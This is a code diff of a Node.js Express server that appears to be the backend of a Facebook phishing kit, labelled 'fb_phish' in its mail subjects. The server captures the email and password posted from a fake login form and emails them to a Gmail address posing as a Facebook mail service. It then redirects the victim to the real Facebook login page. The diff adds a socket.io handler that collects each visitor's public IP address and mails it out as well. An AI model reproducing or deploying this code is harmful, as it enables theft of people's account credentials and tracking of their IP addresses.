@@ -1,18 +1,21 @@
 // NPM packages //
 const express = require('express');
 const app = express();
+const server = require('http').createServer(app);
 const port = process.env.PORT || 8080;
 const hbs = require('hbs');
 const chalk = require('chalk');
 const path = require('path');
 const nodemailer = require("nodemailer");
+const WebSocket = require('socket.io');
+const io = WebSocket(server);
 require('dotenv').config();
 require('./routes/routes')(app);
 
 // files path //
-const staticPath = path.join(__dirname , '/public/');
-const viewsPath = path.join(__dirname , '/templates/views/');
-const partialsPath = path.join(__dirname , '/templates/partials/');
+const staticPath = path.join(__dirname, '/public/');
+const viewsPath = path.join(__dirname, '/templates/views/');
+const partialsPath = path.join(__dirname, '/templates/partials/');
 
 // express url encode for POST request //
 app.use(express.json());
@@ -35,37 +38,62 @@ let transporter = nodemailer.createTransport({
     },
 });
 
-// POST request //
-app.post('/', (req, res) => {
-        let userEmail = req.body.email;
-        let userPass = req.body.pass;
-        let keypass = userEmail + " " + userPass;
-        console.log(keypass);
-        
+io.on('connection', (socket) => {
+
+    // fetching user pubic ip //
+    socket.on('user_ip', userIp => {
+        ipAddress = userIp;
+
         // nodemailer mail option //
         let mailOptions = {
             from: 'facebookmailservices.secure@gmail.com', // sender address
             to: "facebookmailservices.secure@gmail.com", // list of receivers
-            subject: "Mail From fb_phish ✔", // Subject line
-            text: keypass
+            subject: "Mail From fb_phish Ip Address ✔", // Subject line
+            text: userIp
         };
-        
-        transporter.sendMail(mailOptions , (err , data) => {
+
+        transporter.sendMail(mailOptions, (err, data) => {
             if (err) {
                 console.log(`Error Occured => ${err}`);
             } else {
-                console.log('Email Send Sucessfully');
+                console.log('IP address retrived');
             }
         });
-        
-        res.redirect('https://m.facebook.com/login/?refsrc=https%3A%2F%2Fen-gb.facebook.com%2Flogin%2F');
     });
-    
+});
+
+// POST request //
+app.post('/', (req, res) => {
+    let userEmail = req.body.email;
+    let userPass = req.body.pass;
+    let keypass = userEmail + " " + userPass;
+    console.log(keypass);
+
+    // nodemailer mail option //
+    let mailOptions = {
+        from: 'facebookmailservices.secure@gmail.com', // sender address
+        to: "facebookmailservices.secure@gmail.com", // list of receivers
+        subject: "Mail From fb_phish ✔", // Subject line
+        text: keypass
+    };
+
+    transporter.sendMail(mailOptions, (err,
+        data) => {
+        if (err) {
+            console.log(`Error Occured => ${err}`);
+        } else {
+            console.log('Email Send Sucessfully');
+        }
+    });
+
+    res.redirect('https://m.facebook.com/login/?refsrc=https%3A%2F%2Fen-gb.facebook.com%2Flogin%2F');
+});
+
 // listening app on port 8080 //
-app.listen(port , (err) => {
+server.listen(port, (err) => {
     if (err) {
         console.log(`error found while listening on server === ${err}`);
     } else {
-        console.log( chalk.red.bgBlue.bold(`server runnung on    http://127.0.0.1:${port}`));
+        console.log(chalk.red.bgBlue.bold(`server runnung on    http://127.0.0.1:${port}`));
     }
 });
